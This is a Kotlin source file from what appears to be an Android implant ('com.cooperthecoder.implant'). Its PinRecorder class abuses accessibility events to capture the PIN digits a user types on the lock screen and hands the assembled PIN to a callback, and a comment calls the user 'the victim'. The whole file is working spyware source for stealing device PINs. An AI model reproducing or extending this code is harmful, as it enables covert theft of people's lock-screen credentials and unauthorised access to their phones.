/*
* Records PINs entered on the lock screen.
* Since the PIN pad widgets are regular Buttons, an AccessibilityEvent with the text is sent.
* This class parses PINs from a stream of these AccessibilityEvents by reading adding events to a queue
* until the enter key is pressed.
* The contents of the queue at this point will be a PIN entered on the lockscreen, though not necessarily
* a correct PIN.
* */
package com.cooperthecoder.implant.dagger

import com.cooperthecoder.implant.Config
import java.util.*

class PinRecorder(val callback: (String) -> Unit) {

    private object PinPad {
        const val ONE = "[1]"
        const val TWO = "[ABC, 2]"
        const val THREE = "[DEF, 3]"
        const val FOUR = "[GHI, 4]"
        const val FIVE = "[JKL, 5]"
        const val SIX = "[MNO, 6]"
        const val SEVEN = "[PQRS, 7]"
        const val EIGHT = "[TUV, 8]"
        const val NINE = "[WXYZ, 9]"
        const val ZERO = "[0, +]"
        const val DELETE = "[Delete]"
        const val BACK = "[Back]"
        const val ENTER = "[Enter]"
        const val EMERGENCY = "[Emergency]"
    }

    private val digitStack = Stack<String>()
    private var lastEvent = 0L

    fun appendPinDigit(digit: String, eventTime: Long) {
        if (eventTime - lastEvent < Config.KEY_PRESS_TIMEOUT) {
            return
        }

        lastEvent = eventTime
        when (digit) {
            PinPad.BACK, PinPad.DELETE -> {
                try {
                    digitStack.pop()
                } catch (e: EmptyStackException) {
                    // Do nothing
                }
            }
            PinPad.ENTER -> {
                clearPinStack()
            }
            PinPad.EMERGENCY -> {
                // Ignore these
            }
            else -> {
                // Otherwise, add the digit to the digitStack.
                digitStack.push(digit)
            }
        }
    }

    fun clearPinStack() {
        // When the victim presses enter, get ready for a new one.
        callback(digitStack.joinToString("-"))
        digitStack.clear()
    }
}